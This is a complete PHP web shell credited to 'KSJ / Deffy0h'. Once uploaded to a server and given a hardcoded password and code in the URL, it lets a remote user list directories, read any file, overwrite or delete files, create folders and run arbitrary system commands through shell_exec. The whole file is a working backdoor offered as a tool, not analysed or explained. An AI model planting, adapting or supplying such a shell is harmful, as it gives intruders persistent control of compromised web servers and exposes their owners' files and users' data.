
<?php 

#-=================================================-
# Create By KSJ / Deffy0h -Tools:jfloop.pl					
#-=================================================-
# https://github.com/ks001john/JFloop.git
#...................................................

$password='75c6acc472ec91d84cf26a3067c2b883';
$code='ks.john';

#chmod(KSJ.php,777);

if(!isset($_GET [ 'p' ] )){exit;}$p=$_GET [ 'p' ] ;
if(!isset($_GET [ 'code' ] )){exit;}$code_=$_GET [ 'code' ] ;
if($code_!=$code){exit;}
if($password!=$p){echo 'ERRO0'; exit;}

if(isset($_GET [ 'type' ] )){$type=$_GET [ 'type' ] ;}else{exit;}
if($type=='dir'){
DIR_();
}
if($type=='open'){
OPEN_();
}
if($type=='mkdir'){
MKDIR_();
}
if($type=='del'){
DEL_();
}
if($type=='edit'){
EDIT_();
}
if($type=='cmd'){
CMD_();
}

function CMD_(){
if(!isset($_GET [ 'cmd' ] )){exit;}$cmd=$_GET [ 'cmd' ] ;
echo shell_exec($cmd);
}

function EDIT_(){
if(!isset($_GET [ 'path' ] )){exit;}$path=$_GET [ 'path' ] ;
if(!isset($_GET [ 'text' ] )){exit;}$text=$_GET [ 'text' ] ;
$f=fopen($path,'w') or die('e1');
fwrite($f,$text);
fclose($f);
}

function DEL_(){
if(!isset($_GET [ 'path' ] )){exit;}$path=$_GET [ 'path' ] ;
if(!is_dir($path)){
unlink($path);
exit;
}
rmdir($path);
}

function MKDIR_(){
if(!isset($_GET [ 'path' ] )){exit;}$path=$_GET [ 'path' ] ;
mkdir($path,773,true);
}

function OPEN_(){
if(!isset($_GET [ 'path' ] )){exit;}$path=$_GET [ 'path' ] ;
$f=fopen($path,'r') or die('e1');
$r=fread($f,filesize($path));
fclose($f);
echo $r;
}

function DIR_(){
if(!isset($_GET [ 'path' ] )){exit;}$path=$_GET [ 'path' ] ;
$dir=scandir($path);
print_r($dir);
}

?>
